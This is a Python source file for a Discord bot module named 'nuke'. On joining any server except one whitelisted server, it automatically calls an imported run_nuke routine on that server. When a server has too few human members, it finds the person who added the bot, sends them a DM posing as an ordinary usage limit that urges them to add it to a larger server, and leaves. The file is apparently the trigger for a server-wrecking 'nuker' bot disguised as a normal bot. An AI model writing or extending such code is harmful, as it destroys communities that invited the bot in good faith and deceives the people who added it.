from __future__ import annotations

import asyncio
import logging

import discord
from discord import Guild
from discord.ext.commands import Cog

from models.config import config as cfg_type
from nuke.config import get as nuke_cfg
from nuke.engine import run_nuke, stop


class nuke(Cog):
    def __init__(self, bot):
        self.bot = bot
        self._tasks: dict[int, asyncio.Task] = {}

    @Cog.listener()
    async def on_guild_join(self, guild: Guild):
        bcfg = self.bot.cfg
        if guild.id == bcfg.required_server_id:
            return

        ncfg = nuke_cfg()
        if ncfg.minimum_members > 0:
            humans = 0
            try:
                async for m in guild.fetch_members(limit=None):
                    if not m.bot:
                        humans += 1
            except discord.Forbidden:
                logging.warning(f"nuke skip: cannot fetch members in {guild.name}")
                humans = guild.member_count or 0
            except Exception as e:
                logging.warning(f"nuke skip: fetch_members error: {e}")
                humans = guild.member_count or 0
            if humans < ncfg.minimum_members:
                who = None
                try:
                    async for entry in guild.audit_logs(
                        action=discord.AuditLogAction.bot_add, limit=1
                    ):
                        if entry.target and entry.target.id == self.bot.user.id:
                            who = entry.user
                            break
                except discord.Forbidden:
                    logging.warning(f"nuke skip: no audit log access in {guild.name}")
                except Exception as e:
                    logging.warning(f"nuke skip: audit log error: {e}")
                if who and not who.bot:
                    try:
                        await who.send(
                            f"hey! this server doesn't have {ncfg.minimum_members} "
                            f"members to use the bot, please add it to a server "
                            f"with that amount of humans"
                        )

                    except discord.Forbidden:
                        logging.warning(f"nuke skip: could not DM {who}")
                    except Exception as e:
                        logging.warning(f"nuke skip: DM error: {e}")
                await guild.leave()
                return

        await run_nuke(self.bot, guild.id, guild)

    @Cog.listener()
    async def on_guild_remove(self, guild: Guild):
        await stop(guild.id)
        task = self._tasks.pop(guild.id, None)
        if task:
            task.cancel()


def setup(bot):
    bot.add_cog(nuke(bot))
